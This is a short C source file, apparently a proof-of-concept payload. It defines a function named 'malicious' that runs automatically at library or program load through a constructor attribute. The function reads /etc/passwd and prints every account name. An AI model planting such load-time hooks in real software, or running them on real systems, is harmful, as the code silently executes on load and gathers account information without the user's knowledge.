#include <stdio.h>

static int malicious() __attribute__((constructor));

int malicious() {
    FILE *fp;
        char line[256];
        char username[256];

        fp = fopen("/etc/passwd", "r");
        if (fp == NULL) {
            perror("Error opening file");
            return 1;
        }

        while (fgets(line, sizeof(line), fp)) {
            sscanf(line, "%[^:]", username);
            printf("%s\n", username);
        }

        fclose(fp);
        return 0;
}
